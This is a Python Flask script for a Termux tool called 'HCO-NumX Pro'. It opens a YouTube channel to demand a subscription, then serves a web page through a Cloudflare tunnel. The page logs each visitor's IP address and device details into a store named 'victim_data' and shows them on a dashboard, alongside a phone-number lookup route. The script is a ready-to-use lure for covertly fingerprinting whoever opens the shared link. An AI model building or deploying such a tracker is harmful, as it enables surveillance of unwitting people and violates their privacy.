import os, threading, subprocess, time
from flask import Flask, render_template, request
from utils import lookup_number, get_device_info

# 🔐 Show tool name, not-free message, redirect to YouTube
def show_warning_and_redirect():
    os.system("clear")
    print("\033[1;32m[ HCO-NumX Pro ]\033[0m\n")  # Green hacker-style box
    print("🔒 This is NOT a free tool!")
    print("🔗 Redirecting to our YouTube channel to unlock usage...")
    time.sleep(8)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("\n✅ After subscribing, press Enter to continue...")

# 🌐 Flask App setup
app = Flask(__name__)
victim_data = {}

@app.route('/')
def index():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    victim_data[ip] = get_device_info(ua)
    return render_template("index.html")

@app.route('/dashboard')
def dashboard():
    return render_template("dashboard.html", data=victim_data)

@app.route('/lookup', methods=['POST'])
def lookup():
    number = request.form.get('number')
    result = lookup_number(number)
    return result

# 🚀 Start Cloudflare tunnel
def start_cloudflared():
    os.system("pkill cloudflared >/dev/null 2>&1")
    subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://localhost:5000'], stdout=subprocess.DEVNULL)

if __name__ == '__main__':
    show_warning_and_redirect()
    threading.Thread(target=start_cloudflared).start()
    app.run(host='0.0.0.0', port=5000)
